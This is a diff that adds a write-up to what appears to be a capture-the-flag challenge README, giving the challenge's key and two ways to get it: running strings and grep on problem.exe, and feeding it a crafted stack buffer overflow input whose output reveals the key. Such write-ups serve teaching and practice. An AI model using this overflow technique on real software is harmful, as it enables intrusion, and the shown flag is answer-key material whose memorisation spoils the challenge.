@@ -10,7 +10,22 @@
 
 ## Write-up
 
-(TODO)
+From the source code given, the KEY may not be hidden somewhere. So, by using `strings` and grep the output might lead us to the KEY.
+```
+$ strings problem.exe | grep KEY 
+KEY : KACde45f
+```
+And yeah, thats the KEY. Another solution is using Stack Buffer Overflow,
+```
+$ python -c "print 'A'*8 + 'Please!'+ '@'  +'A'*77" 
+AAAAAAAAPlease!@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$ problem.exe AAAAAAAAPlease\!@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Value of Check : 65
+buf2 : Please!@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+temp = Please!@
+KEY : KACde45f
+```
+the KEY is `KACde45f`
 
 ## Other write-ups and resources
 
